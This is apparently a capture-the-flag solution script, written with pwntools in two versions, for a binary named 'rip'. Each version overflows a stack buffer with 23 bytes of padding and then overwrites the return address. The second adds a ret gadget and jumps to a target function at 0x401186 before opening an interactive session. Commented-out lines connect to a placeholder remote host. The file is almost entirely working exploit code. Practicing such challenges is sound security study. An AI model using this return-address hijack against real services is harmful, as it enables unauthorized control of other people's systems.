from pwn import*
elf=ELF("./rip")
context=amd64
io=process('./rip')
#host = "
p=0xf+0x8
#ip = "127.0.0.1"

#io = remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
#io=remote("challenge.example.invalid", 9999, ssl=True, sni="challenge.example.invalid")
bin=0x0000040118b
padding=b'a'*p+p64(bin)
io.sendline(padding)
io.interactive()

from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./rip')

offset = 23
ret_gadget = 0x401016
fun_start = 0x401186

payload = b'A' * offset
payload += p64(ret_gadget)
payload += p64(fun_start)

p.sendline(payload)
p.interactive()